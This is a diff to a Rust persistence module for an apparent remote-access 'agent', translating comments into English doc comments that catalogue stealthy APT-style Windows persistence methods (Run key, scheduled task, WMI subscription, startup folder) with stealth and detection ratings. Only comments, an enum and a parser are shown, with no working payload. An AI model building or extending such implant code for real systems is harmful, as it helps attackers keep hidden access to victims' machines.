@@ -1,5 +1,24 @@
-// Módulo de persistencia para Windows
-// Implementa múltiples métodos de persistencia estilo APT
+//! Persistence module for Windows systems.
+//!
+//! This module implements multiple APT-style persistence mechanisms to maintain
+//! access across system reboots and logoff/logon cycles. All methods are designed
+//! to be stealthy and avoid common detection patterns.
+//!
+//! # Available Methods
+//!
+//! - **Registry Run Key**: Adds entry to auto-start registry key
+//! - **Scheduled Task**: Creates a scheduled task triggered on user logon
+//! - **WMI Event**: Uses WMI event subscription (most stealthy, requires admin)
+//! - **Startup Folder**: Adds shortcut to user's startup folder (least stealthy)
+//!
+//! # Examples
+//!
+//! ```no_run
+//! use agent::persistence::{establish_persistence, PersistenceMethod};
+//!
+//! // Establish registry-based persistence
+//! let result = establish_persistence(PersistenceMethod::RegistryRun);
+//! ```
 
 use crate::argfuscator;
 
@@ -11,20 +30,59 @@ use std::env;
 use std::path::{Path, PathBuf};
 use std::fs;
 
-/// Métodos de persistencia disponibles
+/// Available persistence methods for maintaining access.
+///
+/// Each method has different characteristics in terms of stealth, privilege
+/// requirements, and detection likelihood.
 #[derive(Debug, Clone, Copy)]
 pub enum PersistenceMethod {
     /// Registry Run key (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
+    ///
+    /// Privileges: User  
+    /// Stealth: Low  
+    /// Detection: Easy (commonly monitored)
     RegistryRun,
-    /// Scheduled Task (más sofisticado)
+    
+    /// Scheduled Task with logon trigger
+    ///
+    /// Privileges: User/Admin  
+    /// Stealth: Medium  
+    /// Detection: Medium
     ScheduledTask,
-    /// WMI Event Subscription (APT-like, muy sigiloso)
+    
+    /// WMI Event Subscription (APT-style technique)
+    ///
+    /// Privileges: Admin  
+    /// Stealth: High  
+    /// Detection: Difficult (requires advanced tools)
     WmiEvent,
-    /// Startup folder (fallback simple)
+    
+    /// Startup folder shortcut
+    ///
+    /// Privileges: User  
+    /// Stealth: Low  
+    /// Detection: Easy
     StartupFolder,
 }
 
 impl PersistenceMethod {
+    /// Parses a persistence method from string.
+    ///
+    /// # Arguments
+    ///
+    /// * `s` - Method name (case-insensitive)
+    ///
+    /// # Accepted Values
+    ///
+    /// - "registry" or "reg" → `RegistryRun`
+    /// - "task" or "schtask" → `ScheduledTask`
+    /// - "wmi" → `WmiEvent`
+    /// - "startup" → `StartupFolder`
+    ///
+    /// # Returns
+    ///
+    /// * `Some(PersistenceMethod)` - Valid method
+    /// * `None` - Unknown method
     pub fn from_str(s: &str) -> Option<Self> {
         match s.to_lowercase().as_str() {
             "registry" | "reg" => Some(PersistenceMethod::RegistryRun),
